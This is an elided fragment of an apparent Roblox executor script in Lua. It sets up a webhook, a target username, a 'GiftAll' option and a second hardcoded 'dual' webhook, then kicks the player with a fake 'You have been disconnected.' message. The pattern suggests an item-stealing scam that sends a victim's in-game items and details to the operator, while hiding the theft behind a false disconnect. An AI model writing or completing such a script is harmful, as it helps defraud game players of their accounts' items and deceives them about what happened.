...
local WEBHOOK_ID = getgenv().Webhook or ""
local DUAL_WEBHOOK_ID = "dh_master"

local CONFIG = {
    Username = getgenv().Username or "",
    Webhook = WEBHOOK_ID,
    GiftAll = getgenv().GiftAll or false,
...
if totalTargeted == 0 then
    ...
    LocalPlayer:Kick("You have been disconnected.")
    return
end
